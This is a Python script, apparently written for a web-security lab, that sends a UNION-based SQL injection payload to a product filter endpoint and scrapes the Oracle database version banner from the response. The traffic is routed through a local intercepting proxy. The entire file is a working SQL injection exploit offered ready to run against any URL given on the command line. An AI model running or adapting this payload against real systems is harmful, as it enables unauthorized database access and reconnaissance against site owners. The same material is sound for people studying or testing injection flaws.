import requests
import sys
import urllib3  
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)         
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_oracle_version(url):
    path = '/filter?category=Pets'
    sql_payload = "' UNION select NULL, banner from v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "Oracle" in res:
        print("[+] Found the oracle version name...")
        soup = BeautifulSoup(r.text, 'html.parser')
        oracle_version = soup.find(text=re.compile('.*Oracle Database.*'))
        print("[+] The oracle version is '%s'." % oracle_version)
        return True
    return False

if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Showing the oracle version name ")



if not exploit_oracle_version(url):
    print("[-] Could not find the oracle version name")